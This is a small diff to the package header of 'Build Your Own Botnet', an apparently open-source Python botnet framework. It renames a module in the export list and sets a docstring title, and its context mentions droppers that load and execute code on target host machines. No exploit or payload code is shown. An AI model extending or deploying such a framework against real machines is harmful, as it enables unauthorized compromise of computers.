@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-""" 
+"""Core Framework Modules (Build Your Own Botnet)
 
 88                                  88
 88                                  88
@@ -128,7 +128,7 @@ byob.modules
     droppers to load & execute on target host machines
 
 """
-__all__         = ['database','generators','handlers','loader','payload','security','stager','util']
+__all__         = ['database','constructors','handlers','loader','payload','security','stager','util']
 __version__     = '0.1.5'
 __license__     = 'GPLv3'
 __author__      = 'Daniel Vega-Myhre'
